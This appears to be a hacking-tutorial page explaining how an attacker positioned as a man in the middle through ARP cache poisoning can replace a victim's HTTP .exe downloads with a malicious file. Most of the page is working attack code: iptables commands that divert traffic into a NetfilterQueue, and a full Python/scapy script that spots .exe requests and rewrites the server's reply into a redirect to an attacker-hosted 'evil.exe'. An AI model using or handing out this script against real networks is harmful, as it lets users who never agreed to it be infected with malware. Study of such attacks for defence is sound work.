---
title: "Modifying HTTP download response"
date: 2019-01-09
# geekdocFlatSection: false
# geekdocToc: 6
# geekdocHidden: false
---

After we become the [mitm][arp_cache_poisoning] we can modify HTTP responses by changing the Raw data.  
In this case we check if the victim is downloading a .exe file and we are changing the response from the server so that it includes are own malicious payload.  

We do check against the destination port (dport) and source port (sport). When a sport is present it is a response, when a dport is present it is a request.   

For this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.  
To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:  

[arp_cache_poisoning]: https://jellepelle.github.io/doc_the_hacks/arp/arp_cache_poisoning/

```sh
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

Or without arp spoofing on local machine:  
```sh
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
```

Full code:  

```python
# !/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load and "localhost" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # add the TCP - ACK number of the TCP packet (the HTTP request packet) to a seperate list so we can check that
                # against the TCP - SEQ number in the response
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            # check if response corresponds to a request in our ack list
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet,
                                           # note the trailing newlines
                                           "HTTP/1.1 301 Moved Permanently\nLocation: http://localhost:8000/Downloads/evil.exe\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```
